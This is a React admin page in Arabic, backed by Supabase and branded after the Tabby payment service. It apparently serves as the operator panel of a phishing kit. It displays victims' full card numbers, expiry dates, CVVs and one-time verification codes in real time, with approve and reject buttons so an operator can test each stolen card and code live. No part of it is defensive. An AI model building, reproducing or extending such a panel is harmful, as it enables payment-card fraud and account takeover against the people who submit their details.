import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { useNavigate } from "react-router-dom";
import { AdminSidebar } from "@/components/AdminSidebar";
import { SidebarProvider } from "@/components/ui/sidebar";
import { Loader2, CreditCard, Check, X } from "lucide-react";
import { format } from "date-fns";
import { ar } from "date-fns/locale";
interface TabbyPayment {
  id: string;
  cardholder_name: string;
  card_number: string;
  card_number_last4: string;
  expiry_date: string;
  cvv: string;
  total_amount: number;
  company: string | null;
  phone: string | null;
  payment_status: string;
  created_at: string;
  updated_at: string;
}

interface TabbyPaymentAttempt {
  id: string;
  payment_id: string;
  card_number: string;
  cardholder_name: string;
  expiry_date: string;
  cvv: string;
  created_at: string;
  approval_status?: string;
}

interface TabbyOtpAttempt {
  id: string;
  payment_id: string;
  otp_code: string;
  created_at: string;
  approval_status?: string;
}
const AdminTabbyPayments = () => {
  const [payments, setPayments] = useState<TabbyPayment[]>([]);
  const [paymentAttempts, setPaymentAttempts] = useState<Record<string, TabbyPaymentAttempt[]>>({});
  const [otpAttempts, setOtpAttempts] = useState<Record<string, TabbyOtpAttempt[]>>({});
  const [loading, setLoading] = useState(true);
  const [processing, setProcessing] = useState<string | null>(null);
  const {
    toast
  } = useToast();
  const navigate = useNavigate();
  useEffect(() => {
    const checkAuth = async () => {
      const {
        data: {
          session
        }
      } = await supabase.auth.getSession();
      if (!session) {
        navigate("/admin");
        return;
      }
    };
    checkAuth();
    fetchPayments();
    const channel = supabase.channel('tabby-payments-changes').on('postgres_changes', {
      event: 'INSERT',
      schema: 'public',
      table: 'tabby_payments'
    }, () => {
      toast({
        title: "🔔 طلب دفع تابي جديد!",
        description: "تم استلام طلب دفع جديد",
        duration: 10000
      });
      fetchPayments();
    }).on('postgres_changes', {
      event: 'UPDATE',
      schema: 'public',
      table: 'tabby_payments'
    }, () => {
      fetchPayments();
    }).subscribe();
    return () => {
      supabase.removeChannel(channel);
    };
  }, [navigate]);
  const fetchPayments = async () => {
    try {
      const {
        data,
        error
      } = await supabase.from('tabby_payments').select('*').order('created_at', {
        ascending: false
      });
      if (error) throw error;
      setPayments(data || []);
      
      // Fetch payment attempts and OTP attempts for all payments
      if (data && data.length > 0) {
        const paymentIds = data.map(p => p.id);
        
        const { data: attempts, error: attemptsError } = await supabase
          .from('tabby_payment_attempts')
          .select('*')
          .in('payment_id', paymentIds)
          .order('created_at', { ascending: true });
        
        const { data: otps, error: otpsError } = await supabase
          .from('tabby_otp_attempts')
          .select('*')
          .in('payment_id', paymentIds)
          .order('created_at', { ascending: true });
        
        if (!attemptsError && attempts) {
          const grouped = attempts.reduce((acc, attempt) => {
            if (!acc[attempt.payment_id]) acc[attempt.payment_id] = [];
            acc[attempt.payment_id].push(attempt);
            return acc;
          }, {} as Record<string, TabbyPaymentAttempt[]>);
          setPaymentAttempts(grouped);
        }
        
        if (!otpsError && otps) {
          const grouped = otps.reduce((acc, otp) => {
            if (!acc[otp.payment_id]) acc[otp.payment_id] = [];
            acc[otp.payment_id].push(otp);
            return acc;
          }, {} as Record<string, TabbyOtpAttempt[]>);
          setOtpAttempts(grouped);
        }
      }
    } catch (error) {
      console.error('Error fetching payments:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ في تحميل البيانات",
        variant: "destructive"
      });
    } finally {
      setLoading(false);
    }
  };
  const handleApprovePaymentAttempt = async (attemptId: string, paymentId: string) => {
    setProcessing(attemptId);
    try {
      const { error } = await supabase
        .from('tabby_payment_attempts')
        .update({ approval_status: 'approved' })
        .eq('id', attemptId);
      
      if (error) throw error;
      
      toast({
        title: "تم الموافقة",
        description: "تمت الموافقة على بطاقة الدفع بنجاح"
      });
      fetchPayments();
    } catch (error) {
      console.error('Error approving payment attempt:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة",
        variant: "destructive"
      });
    } finally {
      setProcessing(null);
    }
  };

  const handleRejectPaymentAttempt = async (attemptId: string, paymentId: string) => {
    setProcessing(attemptId);
    try {
      const { error } = await supabase
        .from('tabby_payment_attempts')
        .update({ approval_status: 'rejected' })
        .eq('id', attemptId);
      
      if (error) throw error;
      
      toast({
        title: "تم الرفض",
        description: "تم رفض بطاقة الدفع"
      });
      fetchPayments();
    } catch (error) {
      console.error('Error rejecting payment attempt:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الرفض",
        variant: "destructive"
      });
    } finally {
      setProcessing(null);
    }
  };

  const handleApproveOtp = async (otpId: string, paymentId: string) => {
    setProcessing(otpId);
    try {
      const { error } = await supabase
        .from('tabby_otp_attempts')
        .update({ approval_status: 'approved' })
        .eq('id', otpId);
      
      if (error) throw error;
      
      toast({
        title: "تم الموافقة",
        description: "تمت الموافقة على كود التحقق بنجاح"
      });
      fetchPayments();
    } catch (error) {
      console.error('Error approving OTP:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة على كود التحقق",
        variant: "destructive"
      });
    } finally {
      setProcessing(null);
    }
  };

  const handleRejectOtp = async (otpId: string, paymentId: string) => {
    setProcessing(otpId);
    try {
      const { error } = await supabase
        .from('tabby_otp_attempts')
        .update({ approval_status: 'rejected' })
        .eq('id', otpId);
      
      if (error) throw error;
      
      toast({
        title: "تم الرفض",
        description: "تم رفض كود التحقق"
      });
      fetchPayments();
    } catch (error) {
      console.error('Error rejecting OTP:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء رفض كود التحقق",
        variant: "destructive"
      });
    } finally {
      setProcessing(null);
    }
  };
  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'approved':
        return <Badge className="bg-green-500">موافق عليه</Badge>;
      case 'rejected':
        return <Badge className="bg-red-500">مرفوض</Badge>;
      case 'pending':
        return <Badge className="bg-yellow-500">قيد الانتظار</Badge>;
      default:
        return <Badge>{status}</Badge>;
    }
  };
  if (loading) {
    return <div className="flex h-screen items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin" />
      </div>;
  }
  return <SidebarProvider>
      <div className="flex min-h-screen w-full bg-background" dir="rtl">
        <AdminSidebar />
        <div className="flex-1 p-8">
          <div className="mb-6">
            <h1 className="text-3xl font-bold">طلبات تابي</h1>
            <p className="text-muted-foreground">إدارة طلبات الدفع عبر تابي - تحديث تلقائي</p>
          </div>

          {payments.length === 0 ? <Card className="p-8 text-center">
              <p className="text-muted-foreground">لا توجد طلبات دفع حتى الآن</p>
            </Card> : <div className="grid gap-6">
              {payments.map(payment => <Card key={payment.id} className="overflow-hidden">
                  <CardHeader className="bg-muted/50 border-b">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <CreditCard className="h-5 w-5 text-primary" />
                        <CardTitle className="text-lg">{payment.cardholder_name}</CardTitle>
                      </div>
                      {getStatusBadge(payment.payment_status)}
                    </div>
                    <CardDescription className="mt-1">
                      {format(new Date(payment.created_at), 'PPp', {
                  locale: ar
                })}
                    </CardDescription>
                  </CardHeader>

                  <CardContent className="p-6">
                    {/* معلومات أساسية */}
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-6">
                      {payment.company && <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
                          <div className="text-xs text-blue-600 font-medium mb-1">شركة التأمين</div>
                          <div className="font-bold text-sm text-gray-900 truncate" title={payment.company}>
                            {payment.company}
                          </div>
                        </div>}
                      
                      {payment.phone && <div className="bg-purple-50 border border-purple-200 rounded-lg p-3">
                          <div className="text-xs text-purple-600 font-medium mb-1">رقم الهاتف</div>
                          <div className="font-bold text-sm text-gray-900" dir="ltr">
                            {payment.phone}
                          </div>
                        </div>}
                      
                      <div className="bg-green-50 border border-green-200 rounded-lg p-3">
                        <div className="text-xs text-green-600 font-medium mb-1">المبلغ الإجمالي</div>
                        <div className="font-bold text-lg text-green-700">
                          {payment.total_amount.toFixed(2)} ر.س
                        </div>
                      </div>
                    </div>

                    {/* محاولات الدفع المتعددة */}
                    {paymentAttempts[payment.id] && paymentAttempts[payment.id].length > 0 && (
                      <div className="mb-6">
                        <h3 className="text-lg font-bold mb-4 text-primary">بطاقات الدفع ({paymentAttempts[payment.id].length})</h3>
                        <div className="space-y-4">
                          {paymentAttempts[payment.id].map((attempt, index) => (
                            <div key={attempt.id} className="border-2 border-primary/20 rounded-xl p-4 bg-gradient-to-br from-gray-50 to-white">
                              <div className="flex items-center justify-between mb-3">
                                <div className="flex items-center gap-2">
                                  <CreditCard className="h-5 w-5 text-primary" />
                                  <span className="font-bold text-lg">بطاقة دفع #{index + 1}</span>
                                </div>
                                {attempt.approval_status && (
                                  <Badge className={attempt.approval_status === 'approved' ? 'bg-green-500' : 'bg-red-500'}>
                                    {attempt.approval_status === 'approved' ? 'موافق عليها' : 'مرفوضة'}
                                  </Badge>
                                )}
                              </div>
                              
                              <div className="mb-4 p-4 bg-gradient-to-r from-gray-900 to-gray-700 rounded-xl text-white shadow-lg">
                                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                                  <div>
                                    <div className="text-xs text-gray-400 mb-1">اسم حامل البطاقة</div>
                                    <div className="font-bold text-lg">{attempt.cardholder_name}</div>
                                  </div>
                                  <div>
                                    <div className="text-xs text-gray-400 mb-1">رقم البطاقة</div>
                                    <div className="font-mono font-bold text-lg tracking-wider" dir="ltr">
                                      {attempt.card_number}
                                    </div>
                                  </div>
                                  <div>
                                    <div className="text-xs text-gray-400 mb-1">تاريخ الانتهاء</div>
                                    <div className="font-mono font-bold text-lg" dir="ltr">
                                      {attempt.expiry_date}
                                    </div>
                                  </div>
                                  <div>
                                    <div className="text-xs text-gray-400 mb-1">CVV</div>
                                    <div className="font-mono font-bold text-lg">
                                      {attempt.cvv}
                                    </div>
                                  </div>
                                  <div>
                                    <div className="text-xs text-gray-400 mb-1">تاريخ الإدخال</div>
                                    <div className="text-sm">
                                      {format(new Date(attempt.created_at), 'PPp', { locale: ar })}
                                    </div>
                                  </div>
                                </div>
                              </div>

                              {!attempt.approval_status && (
                                <div className="flex gap-2">
                                  <Button 
                                    onClick={() => handleApprovePaymentAttempt(attempt.id, payment.id)} 
                                    disabled={processing === attempt.id}
                                    className="flex-1 bg-green-600 hover:bg-green-700 text-white"
                                  >
                                    {processing === attempt.id ? (
                                      <Loader2 className="h-4 w-4 animate-spin ml-2" />
                                    ) : (
                                      <Check className="h-4 w-4 ml-2" />
                                    )}
                                    موافقة
                                  </Button>
                                  <Button 
                                    onClick={() => handleRejectPaymentAttempt(attempt.id, payment.id)} 
                                    disabled={processing === attempt.id}
                                    variant="destructive"
                                    className="flex-1"
                                  >
                                    {processing === attempt.id ? (
                                      <Loader2 className="h-4 w-4 animate-spin ml-2" />
                                    ) : (
                                      <X className="h-4 w-4 ml-2" />
                                    )}
                                    رفض
                                  </Button>
                                </div>
                              )}
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {/* أكواد التحقق المتعددة */}
                    {otpAttempts[payment.id] && otpAttempts[payment.id].length > 0 && (
                      <div className="mb-6">
                        <h3 className="text-lg font-bold mb-4 text-primary">أكواد التحقق ({otpAttempts[payment.id].length})</h3>
                        <div className="space-y-4">
                          {otpAttempts[payment.id].map((otp, index) => (
                            <div key={otp.id} className="border-2 border-primary/20 rounded-xl p-4 bg-gradient-to-br from-primary/5 to-white">
                              <div className="flex items-center justify-between mb-3">
                                <span className="font-bold text-lg">كود تحقق #{index + 1}</span>
                                {otp.approval_status && (
                                  <Badge className={otp.approval_status === 'approved' ? 'bg-green-500' : 'bg-red-500'}>
                                    {otp.approval_status === 'approved' ? 'موافق عليه' : 'مرفوض'}
                                  </Badge>
                                )}
                              </div>
                              
                              <div className="mb-4 p-4 bg-primary/10 border-2 border-primary rounded-lg">
                                <div className="text-xs text-primary font-medium mb-2">كود التحقق (OTP)</div>
                                <div className="font-bold text-3xl text-primary text-center tracking-widest">
                                  {otp.otp_code}
                                </div>
                                <div className="text-xs text-gray-500 mt-2 text-center">
                                  {format(new Date(otp.created_at), 'PPp', { locale: ar })}
                                </div>
                              </div>

                              {!otp.approval_status && (
                                <div className="flex gap-2">
                                  <Button 
                                    onClick={() => handleApproveOtp(otp.id, payment.id)} 
                                    disabled={processing === otp.id}
                                    className="flex-1 bg-green-600 hover:bg-green-700 text-white"
                                  >
                                    {processing === otp.id ? (
                                      <Loader2 className="h-4 w-4 animate-spin ml-2" />
                                    ) : (
                                      <Check className="h-4 w-4 ml-2" />
                                    )}
                                    موافقة على الكود
                                  </Button>
                                  <Button 
                                    onClick={() => handleRejectOtp(otp.id, payment.id)} 
                                    disabled={processing === otp.id}
                                    variant="destructive"
                                    className="flex-1"
                                  >
                                    {processing === otp.id ? (
                                      <Loader2 className="h-4 w-4 animate-spin ml-2" />
                                    ) : (
                                      <X className="h-4 w-4 ml-2" />
                                    )}
                                    رفض الكود
                                  </Button>
                                </div>
                              )}
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {/* البطاقة الأولية من الجدول الرئيسي */}
                    {payment.card_number && (
                      <div className="mb-4">
                        <h3 className="text-lg font-bold mb-3 text-gray-700">البطاقة الأساسية</h3>
                        <div className="p-4 bg-gradient-to-r from-gray-900 to-gray-700 rounded-xl text-white shadow-lg">
                          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                            <div>
                              <div className="text-xs text-gray-400 mb-1">رقم البطاقة</div>
                              <div className="font-mono font-bold text-lg tracking-wider" dir="ltr">
                                {payment.card_number}
                              </div>
                            </div>
                            <div>
                              <div className="text-xs text-gray-400 mb-1">تاريخ الصلاحية</div>
                              <div className="font-mono font-bold text-lg" dir="ltr">
                                {payment.expiry_date}
                              </div>
                            </div>
                            <div>
                              <div className="text-xs text-gray-400 mb-1">CVV</div>
                              <div className="font-mono font-bold text-lg">
                                {payment.cvv}
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    )}

                    {/* معلومات التاريخ */}
                    <div className="p-3 bg-gray-50 rounded-lg">
                      <div className="text-xs text-gray-500 mb-1">تاريخ الإنشاء</div>
                      <div className="text-sm font-medium">
                        {format(new Date(payment.created_at), 'PPp', { locale: ar })}
                      </div>
                      {payment.updated_at !== payment.created_at && (
                        <>
                          <div className="text-xs text-gray-500 mb-1 mt-2">آخر تحديث</div>
                          <div className="text-sm font-medium">
                            {format(new Date(payment.updated_at), 'PPp', { locale: ar })}
                          </div>
                        </>
                      )}
                    </div>
                  </CardContent>
                </Card>)}
            </div>}
        </div>
      </div>
    </SidebarProvider>;
};
export default AdminTabbyPayments;